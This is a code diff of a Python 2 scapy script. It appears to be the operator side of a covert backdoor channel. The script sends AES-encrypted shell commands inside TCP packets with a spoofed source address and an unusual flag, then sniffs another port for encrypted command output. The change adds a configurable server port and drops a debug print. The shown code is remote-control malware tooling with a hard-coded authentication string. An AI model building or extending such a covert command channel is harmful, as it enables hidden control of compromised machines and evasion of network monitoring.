@@ -5,8 +5,8 @@ from Crypto.Cipher import AES
 from Crypto import Random
 
 def usage():
-    if len(sys.argv) != 2:
-        print "To use: ", sys.argv[0], "[Server IP]"
+    if len(sys.argv) != 3:
+        print "To use: ", sys.argv[0], "[Server IP] [Server Port]"
         sys.exit()
 
 def stopfilter(pkt):
@@ -39,6 +39,7 @@ def sendCommand():
     global destIP
     global authPacket
     destIP = sys.argv[1]
+    destPort = sys.argv[2]
     #key to authenticating the packet
     authPacket = "Authenticate packets"
     sending = True
@@ -50,12 +51,12 @@ def sendCommand():
             #Encrypt the command with AES encryption
             encryptedCommand = encryptCommand(authPacket + command)
             #Create the packet and store the command in the data field
-            pkt = IP(src="192.168.0.10", dst=destIP)/TCP(dport=8505, flags='C')/Raw(load=encryptedCommand)
+            pkt = IP(src="192.168.0.10", dst=destIP)/TCP(dport=int(destPort), flags='C')/Raw(load=encryptedCommand)
             #Send the packet
             send(pkt)
             sending = False
         else:
-            sniff(timeout=2, filter="tcp and host " + destIP + " and dst port 8505", prn=receiveOutput, stop_filter=stopfilter)
+            sniff(timeout=2, filter="tcp and host " + destIP + " and dst port 8506", prn=receiveOutput, stop_filter=stopfilter)
             sending = True
 
 
@@ -70,7 +71,6 @@ def receiveOutput(pkt):
         flagSet = pkt['TCP'].flags
         if flagSet == long(128):
             #grab the raw data
-            pkt.show()
             data = pkt[Raw].load
             #Decrypt the data
             decryptedData = decryptCommand(data)
